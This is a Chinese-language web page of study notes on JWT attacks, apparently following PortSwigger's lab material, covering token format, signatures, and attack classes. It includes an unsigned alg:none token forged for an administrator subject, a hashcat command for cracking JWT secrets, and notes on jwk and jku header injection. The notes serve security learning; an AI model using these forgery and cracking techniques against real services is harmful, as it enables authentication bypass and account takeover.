<!doctype html>
<html lang="zh-Hans" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-PortSwigger/web-security/JWT" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.7.0">
<title data-rh="true">JWT | C0rr3ct</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://C0rr3c7.github.io/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://C0rr3c7.github.io/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://C0rr3c7.github.io/docs/PortSwigger/web-security/JWT"><meta data-rh="true" property="og:locale" content="zh_Hans"><meta data-rh="true" name="docusaurus_locale" content="zh-Hans"><meta data-rh="true" name="docsearch:language" content="zh-Hans"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="JWT | C0rr3ct"><meta data-rh="true" name="description" content="JWT attacks"><meta data-rh="true" property="og:description" content="JWT attacks"><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://C0rr3c7.github.io/docs/PortSwigger/web-security/JWT"><link data-rh="true" rel="alternate" href="https://C0rr3c7.github.io/docs/PortSwigger/web-security/JWT" hreflang="zh-Hans"><link data-rh="true" rel="alternate" href="https://C0rr3c7.github.io/docs/PortSwigger/web-security/JWT" hreflang="x-default"><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="C0rr3ct RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="C0rr3ct Atom Feed">





<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.24/dist/katex.min.css" integrity="sha384-odtC+0UGzzFL/6PNoE8rX/SPcQDXBJ+uRepguP4QkPCm2LBxH3FA3y+fKSiJ+AmM" crossorigin="anonymous"><link rel="stylesheet" href="/assets/css/styles.aff420c1.css">
<script src="/assets/js/runtime~main.dcbf6bb1.js" defer="defer"></script>
<script src="/assets/js/main.2fdee944.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();t(null!==e?e:"light")}(),function(){try{const n=new URLSearchParams(window.location.search).entries();for(var[t,e]of n)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/img/logo.svg"><div role="region" aria-label="跳到主要内容"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">跳到主要内容</a></div><nav aria-label="主导航" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="切换导航栏" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/logo.svg" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/img/logo.svg" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">C0rr3rt</b></a><a class="navbar__item navbar__link" href="/docs/HackMyVm/">HackMyVm</a><a class="navbar__item navbar__link" href="/docs/VulnHub/">VulnHub</a><a class="navbar__item navbar__link" href="/docs/HackTheBox/">HackTheBox</a><a class="navbar__item navbar__link" href="/docs/category/vulnstack">VulnStack</a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/docs/PortSwigger/">PortSwigger</a><a class="navbar__item navbar__link" href="/docs/category/玄机">应急响应</a><a class="navbar__item navbar__link" href="/docs/CTF/">CTF</a></div><div class="navbar__items navbar__items--right"><a class="navbar__item navbar__link" href="/about">关于</a><a class="navbar__item navbar__link" href="/blog">Blog</a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="切换浅色/暗黑模式（当前为浅色模式）" aria-label="切换浅色/暗黑模式（当前为浅色模式）" aria-live="polite" aria-pressed="false"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"><div class="navbar__search searchBarContainer_NW3z" dir="ltr"><input placeholder="搜索" aria-label="Search" class="navbar__search-input searchInput_YFbd" value=""><div class="loadingRing_RJI3 searchBarLoadingRing_YnHq"><div></div><div></div><div></div><div></div></div></div></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="回到顶部" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="文档侧边栏" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/PortSwigger/">PortSwigger</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" href="/docs/category/web-security">web-security</a><button aria-label="折叠侧边栏分类 &#x27;web-security&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/PortSwigger/web-security/API测试">API测试</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/docs/PortSwigger/web-security/JWT">JWT</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/PortSwigger/web-security/SQL注入">SQL注入</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/PortSwigger/web-security/SSRF">SSRF</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/PortSwigger/web-security/XSS">XSS</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/PortSwigger/web-security/XXE">XXE</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/PortSwigger/web-security/信息泄露">信息泄露</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/PortSwigger/web-security/命令执行">命令执行</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/PortSwigger/web-security/文件上传">文件上传</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/PortSwigger/web-security/路径遍历">路径遍历</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/PortSwigger/web-security/身份验证漏洞">身份验证漏洞</a></li></ul></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="页面路径"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="主页面" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/docs/category/web-security"><span itemprop="name">web-security</span></a><meta itemprop="position" content="1"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">JWT</span><meta itemprop="position" content="2"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">本页总览</button></div><div class="theme-doc-markdown markdown"><header><h1>JWT</h1></header><h2 class="anchor anchorWithStickyNavbar_LWe7" id="jwt-attacks">JWT attacks<a href="#jwt-attacks" class="hash-link" aria-label="JWT attacks的直接链接" title="JWT attacks的直接链接">​</a></h2>
<p><code>JWT </code>通常用于身份验证、会话管理和访问控制机制，这些漏洞可能会危及整个网站及其用户</p>
<p><img decoding="async" loading="lazy" alt="jwt-infographic" src="/assets/images/jwt-infographic-bba3a9440973ddfe5e464cd8f2c4cae0.jpg" width="838" height="425" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="什么是jwt">什么是JWT<a href="#什么是jwt" class="hash-link" aria-label="什么是JWT的直接链接" title="什么是JWT的直接链接">​</a></h2>
<p><code>JSON web tokens (JWTs) </code></p>
<p><code>JSON Web tokens（JWT）</code>是一种用于在系统之间发送加密签名 <code>JSON </code>数据的标准格式</p>
<p>理论上，它们可以包含任何类型的数据，但最常用于发送有关用户的信息，作为身份验证、会话处理和访问控制机制的一部分</p>
<p>与经典<code>session tokens</code>不同，服务器所需的所有数据都存储在<code>JWT</code>本身中。这使得 <code>JWT </code>成为高度分布式网站的首选，在这些网站上，用户需要无缝地与多个后端服务器交互</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="jwt-格式">JWT 格式<a href="#jwt-格式" class="hash-link" aria-label="JWT 格式的直接链接" title="JWT 格式的直接链接">​</a></h3>
<p><code>JWT </code>由三部分组成：头部(header)、有效载荷(payload)和签名(signature)。这些部分由点分隔，如下面的示例所示：</p>
<div class="language-jwt codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-jwt codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">eyJraWQiOiI5MTM2ZGRiMy1jYjBhLTRhMTktYTA3ZS1lYWRmNWE0NGM4YjUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTY0ODAzNzE2NCwibmFtZSI6IkNhcmxvcyBNb250b3lhIiwic3ViIjoiY2FybG9zIiwicm9sZSI6ImJsb2dfYXV0aG9yIiwiZW1haWwiOiJjYXJsb3NAY2FybG9zLW1vbnRveWEubmV0IiwiaWF0IjoxNTE2MjM5MDIyfQ.SYZBPIBg2CRjXAJ8vCER0LA_ENjII1JakvNQoP-Hw6GG1zfl4JyngsZReIfqRvIAEi5L4HV0q7_9qGhQZvy9ZdxEJbwTxRs_6Lb-fZTDpW6lKYNdMyjw45_alSCZ1fypsMWz_2mTpQzil0lOtps5Ei_z7mM7M8gCwe_AGpI53JxduQOaB5HkT5gVrv9cKu9CsW5MS6ZbqYXpGyOG5ehoxqm8DL5tFYaW3lB50ELxi0KsuTKEbD0t5BCl0aCR2MBJWAbN-xeLwEenaqBiwPVvKixYleeDQiBEIylFdNNIMviKRgXiYuAvMziVPbwSgkZVHeEdF5MQP1Oe2Spac-6IfA</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><code>JWT </code>的头部和payload部分只是 <code>base64url </code>编码的<code>JSON</code>对象数据</p>
<p><code>JWT</code>解码网站：<a href="https://jwt.io/" target="_blank" rel="noopener noreferrer">https://jwt.io/</a></p>
<p><img decoding="async" loading="lazy" alt="image-20250512170508056" src="/assets/images/image-20250512170508056-609422d442e4e67128f195cf3880a089.png" width="1616" height="602" class="img_ev3q"></p>
<p>在大多数情况下，任何拥有令牌访问权限的人都可以轻松读取或修改这些数据。因此，任何基于<code>JWT</code>的机制的安全性高度依赖于<strong>加密签名</strong>。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="jwt-签名">JWT 签名<a href="#jwt-签名" class="hash-link" aria-label="JWT 签名的直接链接" title="JWT 签名的直接链接">​</a></h3>
<p><code>JWT signature（签名） </code></p>
<p>通常，颁发令牌的服务器通过**散列头部（例如：alg:&quot;RS256&quot;）**和有效载荷来生成签名。</p>
<p>在某些情况下，它们还会对生成的散列进行加密。无论如何，这个过程都涉及到一个<strong>秘密签名密钥</strong></p>
<p>这种机制为服务器提供了一种验证令牌中的数据自颁发以来是否被篡改的方法：</p>
<ul>
<li>由于签名直接从令牌的其余部分派生而来，更改头部或有效载荷中的单个字节会导致签名不匹配</li>
<li>不知道服务器的<strong>秘密签名密钥</strong>，就不能够生成给定头部或负载的正确签名</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="jwt-vs-jws-vs-jwe">JWT vs JWS vs JWE<a href="#jwt-vs-jws-vs-jwe" class="hash-link" aria-label="JWT vs JWS vs JWE的直接链接" title="JWT vs JWS vs JWE的直接链接">​</a></h3>
<p><code>JWT</code> 规范实际上非常有限。它仅定义了表示信息（&quot;声明&quot;）的<code>JSON</code>对象格式，该格式可以在双方之间传输。在实践中，<code>JWT  </code>并不是作为一个独立的实体来使用的</p>
<p><code>JWT </code>规范通过<code> JSON Web 签名（JWS）</code>和<code> JSON Web 加密（JWE）</code>规范进行了扩展，这些规范定义了实际实现<code>JWT</code>的具体方式</p>
<p><img decoding="async" loading="lazy" alt="jwt-jws-jwe" src="/assets/images/jwt-jws-jwe-63d85ffa7df0b4099b7ab1b97b95f51d.jpg" width="838" height="337" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="jwt签名的缺陷漏洞">JWT签名的缺陷漏洞<a href="#jwt签名的缺陷漏洞" class="hash-link" aria-label="JWT签名的缺陷漏洞的直接链接" title="JWT签名的缺陷漏洞的直接链接">​</a></h2>
<p>设计上，服务器通常不会存储它们签发的<code>JWT </code>的任何信息，相反，每个<code>token</code>都是一个完全自包含的实体。</p>
<p>但是也出现了一个问题，服务器实际上对<code>token</code>的原始签名一无所知</p>
<p>因此，如果服务器没有正确验证签名，就无法阻止攻击者对令牌的其余部分进行任意更改</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="接受任意签名">接受任意签名<a href="#接受任意签名" class="hash-link" aria-label="接受任意签名的直接链接" title="接受任意签名的直接链接">​</a></h3>
<p><code>JWT </code>库通常提供一种验证令牌的方法和另一种仅解码令牌的方法。例如，<code>Node.js </code>库 <code>jsonwebtoken</code> 有 <code>verify()</code> 和 <code>decode()</code></p>
<p>有时，开发者会混淆这两种方法，只将传入的令牌传递给 <code>decode()</code> 方法，这实际上意味着应用程序根本不验证签名。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="接受未签名的令牌">接受未签名的令牌<a href="#接受未签名的令牌" class="hash-link" aria-label="接受未签名的令牌的直接链接" title="接受未签名的令牌的直接链接">​</a></h3>
<p>在<code>JWT</code>的头部，<code>alg</code>参数代表服务器签名的算法</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &quot;alg&quot;: &quot;HS256&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &quot;typ&quot;: &quot;JWT&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><code>JWT</code> 可以使用多种不同的算法进行签名，但也可以不签名。在这种情况下， <code>alg</code> 参数设置为 <code>none</code> ，这表示所谓的<code>未加密 JWT</code></p>
<p>这样进行加密的令牌是没有签名部分的，但是结尾需要用<code>.</code>结束。例如：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">eyJraWQiOiI1NzA1YWVkZi0wYmY5LTRjZWMtYTg1MC04YjM0NjViYzVmZTAiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc0NzA1NTc1MCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="暴力破解密钥">暴力破解密钥<a href="#暴力破解密钥" class="hash-link" aria-label="暴力破解密钥的直接链接" title="暴力破解密钥的直接链接">​</a></h2>
<p>推荐工具：<code>hashcat</code>，<code>JwtCrack</code>，<code>john</code></p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">hashcat -a 0 -m 16500 &lt;jwt&gt; &lt;wordlist&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>如果多次运行该命令，需要包含 <code>--show</code> 标志以输出结果</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="jwt-头部参数注入">JWT 头部参数注入<a href="#jwt-头部参数注入" class="hash-link" aria-label="JWT 头部参数注入的直接链接" title="JWT 头部参数注入的直接链接">​</a></h2>
<p>根据 <code>JWS </code>规范，只有 <code>alg</code> 头部参数是必须的。</p>
<p>然而，在实践中，<code>JWT </code>头部（也称为 <code>JOSE </code>头部）通常包含其他几个参数</p>
<ul>
<li><code>jwk</code> （<code>JSON Web Key</code>） 是一个 <code>JSON </code>对象，用来表示密钥</li>
<li><code>jku</code> （<code>JSON Web Key Set URL</code>）提供了一个 URL，服务器可以从该 URL 获取包含正确密钥的密钥集</li>
<li><code>kid</code> （密钥 ID）提供一个 ID，用来标识验证token该使用哪一个密钥</li>
</ul>
<p>这些受<code>用户控制的参数</code>分别告诉接收服务器在验证签名时应使用哪个密钥</p>
<p><strong>利用这些参数注入可以使用自己的任意密钥而不是服务器的密钥</strong></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="通过jwk注入自签名">通过<code>JWK</code>注入自签名<a href="#通过jwk注入自签名" class="hash-link" aria-label="通过jwk注入自签名的直接链接" title="通过jwk注入自签名的直接链接">​</a></h3>
<p><code>JWK</code>（<code>JSON Web Key</code>）是一种标准化的格式，用于将密钥表示为<code>JSON</code>对象</p>
<p><code>JSON Web 签名（JWS）</code>规范描述了一个可选的 <code>jwk</code> 头部参数，服务器可以使用它将<strong>公钥</strong>直接嵌入到令牌本身中，格式为 <code>JWK</code></p>
<p>例如：</p>
<div class="language-json codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-json codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token property" style="color:#36acaa">&quot;kid&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token property" style="color:#36acaa">&quot;typ&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;JWT&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token property" style="color:#36acaa">&quot;alg&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;RS256&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token property" style="color:#36acaa">&quot;jwk&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token property" style="color:#36acaa">&quot;kty&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;RSA&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token property" style="color:#36acaa">&quot;e&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;AQAB&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token property" style="color:#36acaa">&quot;kid&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token property" style="color:#36acaa">&quot;n&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9m&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="通过jku注入自签名">通过<code>JKU</code>注入自签名<a href="#通过jku注入自签名" class="hash-link" aria-label="通过jku注入自签名的直接链接" title="通过jku注入自签名的直接链接">​</a></h3>
<p>一些服务器允许您使用 <code>jku</code> （<code>JWK Set URL</code>）头参数来引用包含该密钥的<code> JWK Set(JWK 集合)</code>。在验证签名时，服务器从该 URL 获取相关密钥。</p>
<p><code>JWK Set (JWK 集合)</code>是一个包含表示不同密钥的<code>JWK</code>数组的 <code>JSON </code>对象</p>
